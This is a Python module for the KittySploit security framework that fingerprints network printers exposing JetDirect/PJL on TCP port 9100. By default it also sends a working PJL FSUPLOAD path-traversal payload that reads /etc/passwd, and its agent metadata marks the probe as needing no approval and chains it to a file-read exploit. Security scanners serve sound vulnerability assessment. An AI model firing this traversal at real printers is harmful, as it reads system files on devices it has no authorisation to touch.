#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""Detect HP JetDirect / AppSocket raw printing and PJL on TCP 9100."""

import re
import socket
from typing import Optional

from kittysploit import *
from lib.protocols.tcp.tcp_scanner_client import Tcp_scanner_client


class Module(Scanner, Tcp_scanner_client):
    __info__ = {
        "name": "JetDirect / PJL Service Detection (port 9100)",
        "description": (
            "Detects network printers exposing raw JetDirect/AppSocket on TCP 9100 "
            "and probes the PJL command interface with INFO ID. Optionally checks "
            "whether FSUPLOAD path traversal returns /etc/passwd content."
        ),
        "author": ["KittySploit Team"],
        "severity": "info",
        "tags": [
            "scanner",
            "tcp",
            "network",
            "jetdirect",
            "pjl",
            "printer",
            "hp",
            "port-9100",
        ],
        "agent": {
            "risk": "active",
            "effects": ["network_probe"],
            "expected_requests": 2,
            "reversible": True,
            "approval_required": False,
            "produces": ["tech_hints", "risk_signals", "endpoints"],
            "cost": 1.0,
            "noise": 0.3,
            "value": 1.0,
            "requires": {
                "endpoint_pattern_any": [":9100"],
            },
            "chain": {
                "produces_capabilities": [
                    {"capability": "admin_surface", "from_detail": "PJL filesystem interface"},
                ],
                "suggested_followups": [
                    "auxiliary/admin/printer/hp_jetdirect_pjl_file_read",
                ],
            },
        },
        "references": [
            "https://nvd.nist.gov/vuln/detail/CVE-2017-2750",
            "https://book.hacktricks.wiki/en/network-services-pentesting/9100-pjl.html",
        ],
    }

    port = OptPort(9100, "JetDirect raw printing port", True)
    probe_traversal = OptBool(
        True,
        "Also probe FSUPLOAD path traversal for /etc/passwd",
        False,
        advanced=True,
    )

    _UEL = "\x1b%-12345X"
    _PASSWD_RE = re.compile(r"root:[^\n]+:0:0:")
    _VENDOR_MARKERS = (
        "hewlett-packard",
        "hp ",
        "laserjet",
        "officejet",
        "jetdirect",
        "canon",
        "epson",
        "brother",
        "kyocera",
        "xerox",
        "ricoh",
        "lexmark",
        "samsung",
        "konica",
        "minolta",
        "sharp",
        "oki",
        "zebra",
    )

    def _send_pjl(self, body: str) -> str:
        payload = f"{self._UEL}@PJL {body}\r\n{self._UEL}\r\n"
        host = self._host()
        if not host:
            return ""
        sock: Optional[socket.socket] = None
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(max(self._timeout(), 5.0))
            sock.connect((host, int(self._port())))
            sock.sendall(payload.encode("ascii", errors="replace"))
            chunks: list[bytes] = []
            while True:
                try:
                    data = sock.recv(4096)
                except socket.timeout:
                    break
                if not data:
                    break
                chunks.append(data)
            return b"".join(chunks).decode("utf-8", errors="replace")
        except Exception:
            return ""
        finally:
            if sock is not None:
                try:
                    sock.close()
                except Exception:
                    pass

    def _extract_id(self, response: str) -> str:
        for line in (response or "").splitlines():
            cleaned = line.strip()
            if not cleaned or cleaned.startswith("@PJL"):
                continue
            upper = cleaned.upper()
            if upper.startswith("INFO") or upper.startswith("STATUS"):
                continue
            return cleaned[:200]
        return (response or "").strip()[:200]

    def run(self):
        host = self._host()
        port = self._port()
        if not host or not self.is_tcp_open(host=host, port=port):
            return False

        info = self._send_pjl("INFO ID")
        if not info or "@PJL" not in info.upper():
            return False

        device_id = self._extract_id(info)
        lowered = info.lower()
        vendor = next((marker for marker in self._VENDOR_MARKERS if marker in lowered), "")
        severity = "info"
        reason = "JetDirect/PJL interface detected on TCP 9100"
        if device_id:
            reason = f"JetDirect/PJL detected: {device_id}"

        if bool(self.probe_traversal):
            passwd = self._send_pjl('FSUPLOAD NAME="0:/../../../etc/passwd" OFFSET=0 SIZE=4096')
            if self._PASSWD_RE.search(passwd or ""):
                severity = "high"
                reason = "JetDirect PJL FSUPLOAD path traversal exposes /etc/passwd"
                self.set_info(
                    severity=severity,
                    reason=reason,
                    device_id=device_id,
                    vendor=vendor,
                    port=port,
                )
                return True

        self.set_info(
            severity=severity,
            reason=reason,
            device_id=device_id,
            vendor=vendor,
            port=port,
        )
        return True
